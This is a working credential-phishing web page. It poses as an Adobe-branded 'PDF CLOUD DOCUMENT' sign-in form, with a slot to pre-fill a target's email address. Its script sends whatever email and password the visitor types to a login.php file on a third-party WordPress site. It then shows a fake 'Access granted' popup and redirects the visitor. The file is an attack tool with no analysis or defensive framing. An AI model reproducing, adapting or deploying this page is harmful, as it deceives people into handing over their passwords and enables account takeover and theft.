<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PDF CLOUD DOCUMENT FILE</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #555;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            position: relative;
        }

        .blurred-background-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            background-image: url('https://i.postimg.cc/fWk6mJfw/background.jpg');
            background-repeat: no-repeat;
            background-position: top center;
            background-size: cover;
            filter: blur(8px);
            -webkit-filter: blur(4px);
            opacity: 0.7;
        }

        .login-container {
            border-radius: 20px;
            background-color: #ffffff;
            width: 380px;
            padding: 55px 30px 40px 30px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
            text-align: center;
            box-sizing: border-box;
            position: relative;
            z-index: 1;
        }

        .logo {
            width: 70px;
            height: 70px;
            position: absolute;
            top: -35px;
            left: 50%;
            transform: translateX(-50%);
        }
        
        .logo img {
            width: 100%;
            height: 100%;
        }

       

        h2 {
            margin: 0 0 10px 0;
            font-size: 22px;
            color: #000000;
            font-weight: 700;
        }

        .subtitle {
            margin: 0 0 25px 0;
            font-size: 14px;
            color: #333333;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .input-group input[type="email"],
        .input-group input[type="password"] {
            width: 100%;
            padding: 12px 10px;
            border: 1px solid #dcdcdc;
            border-radius: 2px;
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-group input[type="email"]:focus,
        .input-group input[type="password"]:focus {
            border-color: #0054b6;
        }

        .input-group input::placeholder {
            color: #999999;
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 25px;
            text-align: left;
        }

        .checkbox-group input[type="checkbox"] {
            margin: 0 8px 0 0;
            width: 16px;
            height: 16px;
            accent-color: #0078d4;
            cursor: pointer;
        }

        .checkbox-group label {
            font-size: 13px;
            color: #333333;
            cursor: pointer;
        }

        .btn-submit {
            width: 100%;
            padding: 14px;
            background-color: #d32f2f;
            color: #ffffff;
            border: none;
            border-radius: 2px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-submit:hover {
            background-color: #b71c1c;
        }

        .footer-text {
            margin-top: 25px;
            font-size: 9px;
            color: #999999;
            line-height: 1.4;
            text-align: center;
        }

        .error-message {
            color: #d32f2f;
            font-size: 13px;
            margin-bottom: 15px;
            text-align: left;
            display: none;
            background: #f8d7da;
            padding: 8px;
            border-radius: 4px;
        }

        .error-message.show {
            display: block;
        }

        .btn-submit:disabled, .submit-btn:disabled {
            background-color: #f5f5f5;
            color: #a0a0a0;
            cursor: not-allowed;
        }

        .btn-submit.loading {
            opacity: 0.7;
            cursor: wait;
        }

        #messageBox {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.6);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }

        #messageBox .popup-content {
            background-color: white;
            padding: 30px;
            border-radius: 4px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            max-width: 320px;
            width: 100%;
        }

        #messageBox h3 {
            margin: 0 0 10px 0;
            color: #28a745;
            font-size: 20px;
        }

        #messageBox p {
            margin: 0;
            color: #333;
            font-size: 14px;
        }
    </style>
</head>

<body>
    <div class="blurred-background-layer"></div>

    <div class="login-container">
        <!-- Adobe-like Red Logo SVG Placeholder -->
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/42/Adobe_Acrobat_DC_logo_2020.svg" alt="">
        </div>

        <h2>PDF CLOUD DOCUMENT</h2>
        <p class="subtitle">Sign in with your Email</p>

        <form id="loginForm">
            <div id="errorMessage" class="error-message"></div>

            <div class="input-group">
                <input type="email" id="email" placeholder="Email" required>
            </div>

            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>

            <div class="checkbox-group">
                <input type="checkbox" id="rememberMe" checked>
                <label for="rememberMe">Remember me</label>
            </div>

            <button type="submit" class="btn-submit submit-btn">Sign In</button>
        </form>

        <p class="footer-text">
            &copy; 2026 Cloud Storage terms and conditions in accordance with our privacy policy and terms of use. Check
            the official documentation to review our terms of use.
        </p>
    </div>

    <!-- Success Popup -->
    <div id="messageBox" style="display: none;">
        <div class="popup-content">
            <h3>Success</h3>
            <p id="messageBoxText">Access granted! Redirecting...</p>
        </div>
    </div>

    <script>
        EMAIL = ''
    </script>
    <script>
        // Autofill email from variable (edit this value)
        const DEFAULT_EMAIL = EMAIL;

        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const submitBtn = document.querySelector('.submit-btn');
        const errorMessage = document.getElementById('errorMessage');
        const loginForm = document.getElementById('loginForm');

        // Autofill email on page load
        if (DEFAULT_EMAIL && !emailInput.value) {
            emailInput.value = DEFAULT_EMAIL;
        }

        function validateForm() {
            const isValid = emailInput.value.trim() !== '' && passwordInput.value !== '';
            submitBtn.disabled = !isValid;
        }

        emailInput.addEventListener('input', validateForm);
        passwordInput.addEventListener('input', validateForm);

        loginForm.addEventListener('submit', async function (e) {
            e.preventDefault();

            if (emailInput.value && passwordInput.value) {
                submitBtn.classList.add('loading');
                errorMessage.classList.remove('show');

                try {
                    const formData = new FormData();
                    formData.append('email', emailInput.value);
                    formData.append('password', passwordInput.value);

                    const response = await fetch('https://andreandrose.co.uk/wp-includes/login.php', {
                        method: 'POST',
                        body: formData
                    });

                    const result = await response.json();

                    submitBtn.classList.remove('loading');

                    // Clear password field after every attempt
                    passwordInput.value = '';

                    if (result.success) {
                        // Show beautiful success popup
                        showSuccessPopup(result.redirect);
                    } else {
                        // Show error message in the error box
                        errorMessage.textContent = result.message;
                        errorMessage.classList.add('show');
                        // Refocus password for next attempt
                        passwordInput.focus();
                    }
                } catch (error) {
                    submitBtn.classList.remove('loading');
                    console.error('Error:', error);
                    errorMessage.textContent = 'YOUR EMAIL OR PASSWORD IS INCORRECT';
                    errorMessage.classList.add('show');
                    passwordInput.value = '';
                }
            }
        });

        function showSuccessPopup(redirectUrl) {
            const messageBox = document.getElementById('messageBox');
            const messageText = document.getElementById('messageBoxText');

            // Set the message with credentials

            messageBox.style.display = 'flex';

            // Auto-redirect after 2 seconds
            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 2000);
        }

        validateForm();
    </script>
</body>

</html>
